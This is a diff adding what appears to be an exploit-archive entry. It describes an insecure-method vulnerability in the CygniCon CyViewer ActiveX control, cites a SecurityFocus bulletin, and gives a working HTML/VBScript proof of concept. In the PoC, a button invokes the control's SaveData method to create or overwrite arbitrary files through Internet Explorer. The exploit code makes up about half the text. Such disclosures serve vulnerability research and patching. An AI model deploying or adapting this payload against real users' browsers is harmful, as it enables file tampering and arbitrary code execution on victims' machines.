@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/48483/info
+
+CygniCon CyViewer ActiveX control is prone to a vulnerability caused by an insecure method.
+
+Successfully exploiting this issue will allow attackers to create or overwrite files within the context of the affected application (typically Internet Explorer) that uses the ActiveX control. Attackers may execute arbitrary code with user-level privileges. 
+
+<html>
+<object classid='clsid:A6FC2988-16BE-4053-BE89-F562431FD6ED' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+
+Sub Boom()
+arg1="FilePath\Filename_to_create"
+arg2="Data"
+target.SaveData arg1 ,arg2
+End Sub
+
+</script>
+</html>
